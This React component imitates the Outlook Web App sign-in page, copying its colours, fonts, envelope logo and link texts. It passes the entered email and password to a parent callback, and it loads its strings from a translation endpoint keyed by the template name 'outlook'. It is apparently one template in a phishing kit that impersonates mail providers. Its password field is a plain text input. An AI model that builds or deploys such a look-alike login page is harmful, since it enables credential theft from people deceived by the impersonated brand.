'use client'

import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { AlertCircle } from 'lucide-react'

// ════════════════════════════════════════════════════════════════════════════
// TYPES & INTERFACES
// ════════════════════════════════════════════════════════════════════════════

interface OutlookTranslations {
  title: string
  usernamePlaceholder: string
  passwordPlaceholder: string
  signInButton: string
  signInOptions: string
  cannotAccess: string
  createAccount: string
  privacyTerms: string
  errorUsername: string
  errorPassword: string
  errorLogin: string
}

// ════════════════════════════════════════════════════════════════════════════
// MAIN COMPONENT
// ════════════════════════════════════════════════════════════════════════════

interface OutlookWebAppLoginFormProps {
  email?: string
  onSubmit: (email: string, password: string) => Promise<void>
}

export default function OutlookWebAppLoginForm({ 
  email: initialEmail = '', 
  onSubmit,
}: OutlookWebAppLoginFormProps) {
  // State
  const [email, setEmail] = useState(initialEmail)
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [translations, setTranslations] = useState<OutlookTranslations | null>(null)

  // Fetch translations
  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'outlook' })
        })
        
        const data = await response.json()
        if (data.translations) {
          setTranslations(data.translations)
        }
      } catch (error) {
        console.error('Failed to load translations:', error)
        // Fallback to English
        setTranslations({
          title: 'Outlook Web App',
          usernamePlaceholder: 'User name',
          passwordPlaceholder: 'Password',
          signInButton: 'sign in',
          signInOptions: 'Sign-in options',
          cannotAccess: 'Can\'t access your account?',
          createAccount: 'Create one!',
          privacyTerms: 'Privacy and cookies',
          errorUsername: 'Please enter your email address',
          errorPassword: 'Please enter your password',
          errorLogin: 'Sign in failed. Please try again.'
        })
      }
    }
    
    fetchTranslations()
  }, [])

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    if (!translations) return

    if (!email) {
      setError(translations.errorUsername)
      return
    }

    if (!password) {
      setError(translations.errorPassword)
      return
    }

    setLoading(true)

    try {
      await onSubmit(email, password)
    } catch (err: any) {
      setError(err.message || translations.errorLogin)
    } finally {
      setLoading(false)
    }
  }

  if (!translations) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      background: '#f0f0f0',
    }}>
      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* LEFT: OUTLOOK LOGO PANEL */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <div style={{
        width: '440px',
        background: 'linear-gradient(180deg, #0078d4 0%, #005a9e 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        flexShrink: 0,
      }}>
        <div style={{
          textAlign: 'center',
        }}>
          {/* Outlook-Style Logo - CSS Envelope Icon */}
          <div style={{
            width: '120px',
            height: '120px',
            background: '#0078d4',
            borderRadius: '8px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            margin: '0 auto',
            boxShadow: '0 8px 24px rgba(0,0,0,0.2)',
            position: 'relative',
          }}>
            {/* Envelope Base */}
            <div style={{
              width: '70px',
              height: '50px',
              background: 'white',
              borderRadius: '3px',
              position: 'relative',
              boxShadow: '0 2px 8px rgba(0,0,0,0.15)',
            }}>
              {/* Envelope Flap - Top Triangle */}
              <div style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: 0,
                height: 0,
                borderLeft: '35px solid transparent',
                borderRight: '35px solid transparent',
                borderTop: '25px solid #0078d4',
              }} />
              
              {/* Envelope Flap - Bottom overlay */}
              <div style={{
                position: 'absolute',
                top: '25px',
                left: 0,
                width: '70px',
                height: '25px',
                background: 'white',
                clipPath: 'polygon(0 0, 50% 60%, 100% 0)',
              }} />
              
              {/* Letter inside - horizontal lines */}
              <div style={{
                position: 'absolute',
                top: '15px',
                left: '10px',
                right: '10px',
                display: 'flex',
                flexDirection: 'column',
                gap: '4px',
              }}>
                <div style={{ height: '2px', background: '#e0e0e0', width: '80%' }} />
                <div style={{ height: '2px', background: '#e0e0e0', width: '60%' }} />
                <div style={{ height: '2px', background: '#e0e0e0', width: '70%' }} />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ════════════════════════════════════════════════════════════════════ */}
      {/* RIGHT: LOGIN FORM */}
      {/* ════════════════════════════════════════════════════════════════════ */}
      <div style={{
        flex: 1,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '40px',
      }}>
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          style={{
            width: '100%',
            maxWidth: '440px',
          }}
        >
          {/* Title */}
          <h1 style={{
            fontSize: '28px',
            fontWeight: '300',
            color: '#0078d4',
            marginBottom: '32px',
            fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
            letterSpacing: '-0.5px',
          }}>
            {translations.title}
          </h1>

          {/* Login Form */}
          <form onSubmit={handleSubmit} style={{ marginBottom: '24px' }}>
            {/* Username/Email Field */}
            <div style={{ marginBottom: '16px' }}>
              <label style={{
                display: 'block',
                fontSize: '13px',
                color: '#323130',
                marginBottom: '8px',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                fontWeight: '400',
              }}>
                {translations.usernamePlaceholder}
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={translations.usernamePlaceholder}
                style={{
                  width: '100%',
                  padding: '10px 12px',
                  border: '1px solid #8a8886',
                  borderRadius: '2px',
                  fontSize: '15px',
                  fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                  color: '#323130',
                  fontWeight: '400',
                  boxSizing: 'border-box',
                  outline: 'none',
                }}
                onFocus={(e) => e.target.style.borderColor = '#0078d4'}
                onBlur={(e) => e.target.style.borderColor = '#8a8886'}
              />
            </div>

            {/* Password Field */}
            <div style={{ marginBottom: '24px' }}>
              <label style={{
                display: 'block',
                fontSize: '13px',
                color: '#323130',
                marginBottom: '8px',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                fontWeight: '400',
              }}>
                {translations.passwordPlaceholder}
              </label>
              <input
                type="text"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={translations.passwordPlaceholder}
                style={{
                  width: '100%',
                  padding: '10px 12px',
                  border: '1px solid #8a8886',
                  borderRadius: '2px',
                  fontSize: '15px',
                  fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                  color: '#323130',
                  fontWeight: '400',
                  boxSizing: 'border-box',
                  outline: 'none',
                }}
                onFocus={(e) => e.target.style.borderColor = '#0078d4'}
                onBlur={(e) => e.target.style.borderColor = '#8a8886'}
              />
            </div>

            {/* Error Message */}
            {error && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                style={{
                  padding: '12px',
                  background: '#FDE7E9',
                  border: '1px solid #E81123',
                  borderRadius: '2px',
                  marginBottom: '16px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                }}
              >
                <AlertCircle style={{ width: '16px', height: '16px', color: '#E81123', flexShrink: 0 }} />
                <span style={{ fontSize: '13px', color: '#E81123', fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif', fontWeight: '400' }}>
                  {error}
                </span>
              </motion.div>
            )}

            {/* Sign In Button */}
            <button
              type="submit"
              disabled={loading}
              style={{
                width: '100%',
                padding: '12px',
                background: loading ? '#c7e0f4' : '#0078d4',
                color: 'white',
                border: 'none',
                borderRadius: '2px',
                fontSize: '15px',
                fontWeight: '600',
                cursor: loading ? 'not-allowed' : 'pointer',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                transition: 'background 0.2s',
                textTransform: 'none',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
              }}
              onMouseEnter={(e) => {
                if (!loading) e.currentTarget.style.background = '#106ebe'
              }}
              onMouseLeave={(e) => {
                if (!loading) e.currentTarget.style.background = '#0078d4'
              }}
            >
              {loading ? (
                <>
                  <div style={{
                    width: '16px',
                    height: '16px',
                    border: '2px solid white',
                    borderTop: '2px solid transparent',
                    borderRadius: '50%',
                    animation: 'spin 0.8s linear infinite',
                  }} />
                  <span>Signing in...</span>
                </>
              ) : (
                <>
                  <span style={{
                    width: '16px',
                    height: '16px',
                    border: '2px solid white',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '10px',
                  }}>→</span>
                  {translations.signInButton}
                </>
              )}
            </button>
          </form>

          {/* Additional Options */}
          <div style={{
            display: 'flex',
            flexDirection: 'column',
            gap: '12px',
            marginTop: '24px',
          }}>
            <a
              href="#"
              style={{
                color: '#0078d4',
                fontSize: '13px',
                textDecoration: 'none',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                fontWeight: '400',
              }}
            >
              {translations.signInOptions}
            </a>
            <a
              href="#"
              style={{
                color: '#0078d4',
                fontSize: '13px',
                textDecoration: 'none',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                fontWeight: '400',
              }}
            >
              {translations.cannotAccess}
            </a>
          </div>

          {/* Footer Links */}
          <div style={{
            marginTop: '48px',
            paddingTop: '24px',
            borderTop: '1px solid #edebe9',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
          }}>
            <a
              href="#"
              style={{
                color: '#605e5c',
                fontSize: '12px',
                textDecoration: 'none',
                fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
                fontWeight: '400',
              }}
            >
              {translations.privacyTerms}
            </a>
            <span style={{
              color: '#605e5c',
              fontSize: '12px',
              fontFamily: 'Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif',
              fontWeight: '400',
            }}>
              ...
            </span>
          </div>
        </motion.div>
      </div>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  )
}

